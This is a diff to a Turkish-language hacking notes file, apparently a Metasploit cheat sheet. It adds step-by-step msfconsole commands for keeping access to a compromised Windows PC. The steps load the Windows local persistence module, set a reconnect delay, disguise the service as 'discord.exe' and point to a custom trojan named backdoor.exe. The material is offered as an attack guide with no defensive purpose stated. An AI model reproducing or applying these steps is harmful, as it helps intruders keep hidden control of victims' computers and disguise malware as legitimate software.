@@ -23,3 +23,12 @@
 * ```screenshot```: Hedef PC'nin Ekran Görüntüsünü Alır
 
 # Hedef PC'yi Hackledikten Sonra Bağlantıyı Sürdürebilir Hale Getirmek
+
+#### 1.```msfconsole```
+#### 2.```use exploit/windows/local/persistence```
+#### 3.```show options```
+#### 4.```delay 10``` Hedef PC Tekrar Açıldıktan Kaç Saniye Sonra Session'un Açılcağını Belirleriz
+#### 5.```exe_name discord.exe```  Hedef PC'nin Servis Listesinde Görünecek İsim (e.g. discord.exe)
+#### 6.```show advanced```
+#### 7.```set exe::custom /var/www/html/backdoors/tcp backdoor.exe``` Trojan'in Bulunduğu Konum
+#### 8.```exploit```
